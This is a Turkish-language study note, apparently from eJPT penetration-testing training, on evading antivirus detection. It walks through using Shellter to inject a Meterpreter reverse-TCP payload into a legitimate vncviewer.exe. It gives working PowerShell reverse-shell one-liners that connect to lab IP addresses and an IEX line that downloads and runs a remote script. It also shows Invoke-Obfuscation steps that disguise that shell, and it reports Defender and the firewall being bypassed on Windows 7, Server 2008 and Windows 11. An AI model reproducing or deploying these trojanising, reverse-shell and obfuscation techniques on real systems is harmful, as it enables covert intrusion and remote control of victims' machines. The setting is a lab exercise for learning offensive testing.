#av-evasion #anti-virusten-kaçma #obfuscation #bypass #gizleme 

---

## AV Evasion With Shellter

#av-shelter
### Defense Evasion
Defense Evasion, düşmanların, kurbanlarını ele geçirdikleri süre boyunca <span style="background:#ff4d4f">tespit edilmeyi önlemek</span> için kullandıkları tekniklerden oluşur. Defense Evasion için kullanılan teknikler arasında <span style="background:#d4b106">güvenlik yazılımlarını kaldırmak/devre dışı bırakmak veya veri ve komut dosyalarını karıştırmak/şifrelemek bulunur.</span> Düşmanlar ayrıca kötü amaçlı yazılımlarını gizlemek ve gizleme/şaşırtma yapmak için güvenilen işlemleri kullanır ve istismar ederler.

![[Pasted image 20240404104122.png]]
## 1. AV database  içindeki bilinen signature / imzalar ile eşleşmemesi gerekiyor. 
#### "Signature based detection"
### Virus signature nedir : Unique yani eşsiz bir bytes dizilimi veya frekansıdır / unique string of text. Aslında siz mallware yazarken yaptığınız değişiklikler bu unique olayını bozar ve antivirus database'inde tespit edilemez.

##### Şimdi piyasada yeni bir mallware, virus veya ransomware türediği zaman AV şirketlerinde bulunan Mallware Analizcilerinin yaptığı işlerden bir tanesi de Bu Mallware Database 'e  bu analiz edilen mallware'in signaturesini kaydetmektir.

## Örnek :
### Örneğin ben bilgisayarıma google chrome exe'sini yükledim . Bunu yükledikten sonra AV solution bu yüklediğim program için chrom'un hash'ini, signaturesini üretiyor ve bunu kendi database'i ile karşılaştırıyor. Eğer kendi database'inde bu varsa bunu engelliyor. 

##### Signature Based Detection açısından biz eğer ürettiğimiz mallware'in squence of bytes'ını değiştirirsek modify edersek böylece signatura değişmiş olur ve database de karşılığı olmaz.
# Bunu yapmanın en akıllıca yolu yasal bir exe içine bizim shellcodu'muzu yerleştirmektir.





## 2. Belirlenmiş kurallar var bir kodun malicious olup olmamasıyla alakalı fiziksel olarak bunlara benzememeli .

### heuristic 'e yakalanmak istemiyorsan belirli code pattern'lerinden kaçınman gerekir.



## 3. Davranışsal olarak benzerse yakalıyor. (Yeni tür kötü amaçlı yazılımlar için kullanılır)
### Program çalıştığında neler yapıyor bunu inceleyerek koruma sağlıyorlar.
##### Çoğu MODERN AV çözümü bu tekniklerin birleşimi veya bir kombinasyonunu kullanırlar teknik olarak.



---
## AV Evasion Techniques

![[Pasted image 20240404104133.png]]
<span style="background:#d4b106">Obfuscation reorganizes code in order to make it harder to analyze or RE.</span> Yenşden organize ediyoruz kodumuzu
Encoding te başka bir türe uzantıya çeviriyoruz. Tekrar eski haline getirince maliciour olarak kullanıma hazır oluyor.
![[Pasted image 20240404112603.png]]
![[Pasted image 20240404112623.png]]
![[Pasted image 20240404112647.png]]

![[Pasted image 20240404104144.png]]
##### Windows API de payload injekte edilir ve asıl disk'e kaydedilmez.
## Payload daha sonra bellekte ayrı bir iş parçacığında yürütülür.
# Bu durum eJPT içinde değil başka ADVANCED bir Kursta Gösterilecektir.

---

## AV Evasion Techniques --->>> ya yasal bir programın .exe'sine bu zararlı yazılımı gömeriz GOOGLE CHROME VEYA WINZIP WINRAR GIBI.....

# AV evasion multi-tiered ÇOK KATMANLI bir süreçdir.

##### Ayrıca sonsuz sayıda EDR'ye veya antivirus solutions'a dikkat etmek gerekir.
![[Pasted image 20240404105709.png]]

## Bizim yazdığımız malware belki windows defender'i geçebilir ama MALWAREBYTES'ı geçemeyebilir.
![[Pasted image 20240404105848.png]]

---
## Demo: AV Evasion With Shellter
#### https://www.shellterproject.com/

![[Pasted image 20240404123249.png]]
![[Pasted image 20240404123401.png]]
##### PE : PORTABLE EXECUTABLE
### Windows'un kendi native application'larında kullanılabiliyor.
![[Pasted image 20240404123605.png]]
![[Pasted image 20240404145230.png]]
![[Pasted image 20240404145302.png]]
![[Pasted image 20240404145358.png]]

---
# #Shellter
Shellter, dinamik bir shellcode enjeksiyon aracıdır ve şimdiye kadar oluşturulan ilk gerçekten dinamik PE enfeksiyonu aracıdır.

<span style="background:#d4b106">Bu, yerel Windows uygulamalarına shellcode enjekte etmek için kullanılabilir.</span>

Shellcode, sizin tarafınızdan oluşturulmuş bir şey veya Metasploit gibi bir çerçeveden üretilmiş bir şey olabilir.

Shellter, PE dosyasının orijinal yapısından faydalanır ve <span style="background:#d4b106">kullanıcı istemedikçe bölümlerde bellek erişim izinlerini değiştirme gibi herhangi bir değişiklik yapmaz, RWE erişimine sahip ek bir bölüm eklemek</span> veya <span style="background:#ff4d4f">AV taramasında şüpheli görünecek başka bir şey yapmaz.</span>

Shellter, hedef uygulamanın yürütme akışına dayanan benzersiz bir dinamik yaklaşım kullanır ve bu sadece buzdağının görünen kısmıdır.

Shellter, yalnızca bir EPO enfektörü değildir ve yürütme akışını payload'a yönlendirmek için bir talimat eklemek için bir konum bulmaya çalışmaz.

Herhangi bir enfektörün aksine, Shellter'ın gelişmiş enfeksiyon motoru, yürütme akışını enfekte PE dosyasına bir kod mağarasına veya eklenmiş bir bölüğe aktarmaz.

Shellter Pro Plus ve Shellter Pro'da sunulan özel özellikler hakkında bilgi burada ve burada bulunabilir.

Ana Özellikler

Windows x86/x64 (XP SP3 ve üzeri) & Wine/CrossOver için uyumlu.  <span style="background:#d4b106">Wine Linux da exe çalıştırmayı sağlar.</span>
Taşınabilir - Kurulum gerektirmez.
Ek bağımlılıklar gerektirmez (python, .net, vb.).
Statik PE şablonları, çerçeve sarmalayıcılar vb. yoktur.
32-bit payload'ları destekler (Metasploit tarafından oluşturulmuş veya kullanıcı tarafından özel olarak oluşturulmuş olanlar).
<span style="background:#d4b106">Metasploit tarafından sağlanan her türlü kodlamayı destekler.</span>
Kullanıcı tarafından oluşturulan özel kodlamayı destekler.
Gizlilik Modu - Orijinal İşlevselliği Korur.
Çoklu Payload PE enfeksiyonu.
Patentli Kodlama + Kullanıcı Tanımlı Kodlama Sırası.
Dinamik İş Parçacığı Bağlam Anahtarları.
Yansıtmalı DLL yükleyicileri destekler.
<span style="background:#d4b106">Gömülü Metasploit Payload'ları.</span>
Rastgele kod Polimorfik motoru.
İş Parçacığı bağlamı farkında Polimorfik motor.
Kullanıcı kendi özel Polimorfik kodunu kullanabilir.
Anti-statik analiz için Dinamik İş Parçacığı Bağlam bilgilerinden faydalanır.
Kendi kendini değiştiren kodları algılar.
Tek ve çoklu iş parçacığı uygulamalarını izler.
Tamamen dinamik enjeksiyon konumları, yürütme akışına dayalı olarak belirlenir.
Kullanıcı hangi enjekte edileceğini, ne zaman ve nereye seçer.
Komut Satırı desteği.
Ücretsiz

https://www.shellterproject.com/introducing-shellter/

---

## download shellter #shellter 
##### apt-get install shellter -y

### Shellter packet Windows exe dosyasıdır. Peki ben bunu nasıl çalıştıracağım kali linux da  #wine 
#wine-exe-linuxta-çalıştırma 

# shellter package yükledikten sonra ayrıca wine yüklemene gerek var.

---

## #wine-yüklemek 
### shellter sadece 32 bitlik mimariyi desteklediği için biz de wine32 bitlik yükleyeceğiz.

## bizim kullandığımız kali 64 bitlik mimaride ve 32 bitlik bir araç yüklemek için aşağıdaki komutları kullanmalıyız.

#### <span style="background:#d4b106">dpkg --add-architecture i386</span>
 
![[Pasted image 20240404151305.png]]


![[Pasted image 20240404200353.png]]
### başlamadan önce yasal toolar nelerdir bunlara bakarak hangisine bizim shellcode'muz emjekte edilir bunun ayarlanması gerekir.
![[Pasted image 20240404200534.png]]


## hangisine enjekte edeceksek kali içinde var zaten diğer Chrome veya VLC.exe işe yaramaz büyük ihtimalle. Bu kalinin içindekiler yarayacaktır.

![[Pasted image 20240404200934.png]]
![[Pasted image 20240404202858.png]]
![[Pasted image 20240404203036.png]]
![[Pasted image 20240404203309.png]]

##### bunu eJPT içine kaydettim/kopyaladım.
## Bunlardan bir tanesi #vncviewer 
### Bu malicious olmayan küçük yasal bir windows programıdır.



---
WINEPREFIX=~/.wine32 WINEARCH=win32 winecfg
WINEPREFIX=~/.wine32 wine shellter.exe

winetricks dlls install kernel32
##### Yüklemede sorun çıkarsa çözüm yukarıdaki command

![[Pasted image 20240404202644.png]]

---
## Şimdi vncviewer.exe   binary'nin içine biz malicious kodumuzu yerleştireceğiz ve bunu da win 7 de defender açıkken çalıştırdığımızda sorun olmadan malicious kod çalışacak.  
### Yalnız asıl gerçek olan bizim vncviewer bozulmaması için bunu backup yapsan iyi olur.


---
![[Pasted image 20240404202644.png]]
![[Pasted image 20240404203745.png]]
### Shellter ı açtık ve bizden operation mod seçmemizi istedi.
## Auto --> A 'yı seçtik

### PE target --> Portable Executable Target

![[Pasted image 20240404204039.png]]
### Bu şekilde programın orjinalinin backup'ını aldı ve shellter_backups bölümüne yerleştirdi.

![[Pasted image 20240404204340.png]]
## Burası çok önemli bu binary kendi işlemlerini yürütsünmü kendisi yukleme yapar gibi çalışsın mı bunu soruyor.

## Payloads
![[Pasted image 20240404204558.png]]
### Bize şimdi payload nasıl olsun bunu soruyor --->> eğer biz daha önceden msfvenom ile bir payload hazırlamışsak CUSTOM modu seç diyor. 
## Bu durumda biz bu listedekinden seçtik L  ve sonra 1 'i işaretledik

### buradan sonra lport lhost'u ayarladık ve artık bizim eJPT içindeki AV bypass klasörü içindeki binary'miz malicious bir binary.

---

##### python3 http server ile win 7 içine attık bu vcnviewer'ı ve multihandler açıp dinlemeye başladık. karşı taraf binary çalıştırdığında herşey normal çalıştı ama bize shell geldi.

# MULTI/HANDLER DİKKAT
## set LPORT 1234
## set LHOST 10.0.2.4
### set PAYLOAD windows/meterpreter/reverse_tcp

---

![[Pasted image 20240404210340.png]]
![[Pasted image 20240404210423.png]]
![[Pasted image 20240404210439.png]]


![[Pasted image 20240404210602.png]]
![[Pasted image 20240404210618.png]]

----
### Windows server 2008 metasploitable 3 Firewall açıkken de bypass yapabildik.
![[Pasted image 20240404212244.png]]
![[Pasted image 20240404212342.png]]

----

## Obfuscating PowerShell Code

<span style="background:#d4b106">+ Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE.</span> 
##### RE--> Reverse Engineering

+ As a penetration tester, you will find yourself working with PowerShell code frequently. <span style="background:#ff4d4f">Most AV solutions will immediately flag malicious PowerShell code, as a result, you must be able to obfuscate/encode your PowerShell code and scripts in order to avoid detection.</span>


## Invoke-Obfuscation 
Invoke-Obfuscation is an open source PowerShell v2.0+ compatible PowerShell command and script obfuscator.
### GitHub Repo:
##### https://github.com/danielbohannon/Invoke-Obfuscation

# Invoke-Obfuscation
### Bu github repo --->> Yazdığımız powershell kodu obfuscate yapmamıza saklamamıza yarıyor. 
##### Bu obfuscate edilen kod ya direk hedef sistemde kullanılıyor ya da büyük bir exploitin parçası olarak kullanılabliyor.

https://github.com/swisskyrepo/PayloadsAllTheThings

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell

#payloads-all-the-things

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Biz Bunu Kullanacağız
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.2.4',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


```


```
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```


---
## git cole ile aldığımız repo'yu eJPT içine obfuscation olarak kaydettim.


![[Pasted image 20240404235338.png]]
### Kali'den Powershell'i açtım ve buradan eJPT klasörü obfuscationa gittim

![[Pasted image 20240404235520.png]]

![[Pasted image 20240404235630.png]]
![[Pasted image 20240404235708.png]]
### Import-Module ./Invoke-Obfuscation.psd1

## Burası önemli bir step back yapıyoruz cd ..  ile

## PS> Invoke-Obfuscation
![[Pasted image 20240404235858.png]]

![[Pasted image 20240404235935.png]]

# Burada Önemli Olan Obfuscation Teknikleri
![[Pasted image 20240405000056.png]]
### Biz burada AST 'yi kullanacağız

##### 1. Şimdi #payloads-all-the-things den aldığımız powershell reverse shell code'u kopyalıyoruz.

##### 2. Bunu bir text editore kopyalıyoruz.
![[Pasted image 20240405000446.png]]

##### 3. Tırnak işaretine kadar olan bölümden kurtuluyoruz.
![[Pasted image 20240405000534.png]]
![[Pasted image 20240405001134.png]]
### shell.ps1 olarak kaydettik

##### 4. Invoke-Obfuscation> SET SCRIPTPATH /home/kali/Documents/eJPT/obfuscation/shell.ps1

![[Pasted image 20240405001358.png]]

### 5. Bu örnek mesela encoding yapacaksak ENCODING seçip bizi yeni bir menuye yönlendiriyor oradan devam ediyoruz. 
![[Pasted image 20240405001624.png]]

### 1 'i seçtim ASCII 'yi 
![[Pasted image 20240405001855.png]]
### Bu result'ı kopyalayıp kaydediyoruz ve hedef sisteme transfer edip çalıştırdığımızda yakalanmadan bize shell veriyor.

![[Pasted image 20240405001959.png]]

---
## Burada geri çıkmak zor oldu help menusunu çalıştırdık. BACK ile geri menuye geldik ve tekrardan
SET SCRIPTPATH /home/kali/Documents/eJPT/obfuscation/shell.ps1

## Bu komutu çalıştırdık.

##### 5. AST yi seçtik
![[Pasted image 20240405002402.png]]
### ALL ve Arkasından 1 seçeneğini seçtik
![[Pasted image 20240405002511.png]]
```
$client = New-Object System.Net.Sockets.TCPClient('10.0.2.4',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 

```
### Bize bu sonucu verdi
```
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('10.0.2.4',4242));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
---


### Python3 -m http server ile bizim oluşturduğumuz obfuscated.ps1 'i karşı tarafa attık ve powershell içinde çalıştırdık.
## ve windows firewall herşey açık olmasına rağmen shell'i aldık.


![[Pasted image 20240405003941.png]]
![[Pasted image 20240405003905.png]]

![[Pasted image 20240405003818.png]]

---
---
### Win 11 dede denedim oluyor. Sadece yüklerken bu güvenilmez dedi.
![[Pasted image 20240405005229.png]]
![[Pasted image 20240405005141.png]]
![[Pasted image 20240405005254.png]]
![[Pasted image 20240405005317.png]]

### Bridge adapter'a alıp denedim direk çalıştırdı.

![[Pasted image 20240405010936.png]]







